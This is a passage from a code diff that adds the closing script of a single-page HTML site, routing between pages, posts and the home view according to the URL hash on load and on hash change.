+            if (hash) {
+                if (pages[hash]) {
+                    renderPage(hash);
+                } else {
+                    renderPost(hash);
+                }
+            } else {
+                renderHome();
+            }
+        });
+
+        // Initial Load
+        const initialHash = window.location.hash.replace('#', '');
+        if (initialHash) {
+            if (pages[initialHash]) {
+                renderPage(initialHash);
+            } else {
+                renderPost(initialHash);
+            }
+        } else {
+            renderHome();
+        }
+    </script>
+</body>
+</html>
